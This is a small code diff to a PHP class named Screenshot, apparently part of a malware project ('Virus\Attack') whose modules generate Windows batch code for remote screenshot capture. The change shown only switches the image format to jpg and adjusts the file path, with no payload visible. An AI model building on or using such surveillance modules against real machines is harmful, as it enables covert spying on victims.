@@ -14,10 +14,10 @@ use Kelvinho\Virus\Attack\BaseScript\Windows;
  * @license http://www.opensource.org/licenses/mit-license.html  MIT License
  */
 class Screenshot extends AttackBase {
-    public static string $IMG_EXTENSION = "png";
+    public static string $IMG_EXTENSION = "jpg";
 
     public function getScreenPath(): string {
-        return DATA_FILE . "/attacks/" . $this->getAttackId() . "/screen.png";
+        return DATA_DIR . "/attacks/" . $this->getAttackId() . "/screen." . self::$IMG_EXTENSION;
     }
 
     public function generateBatchCode(): void {
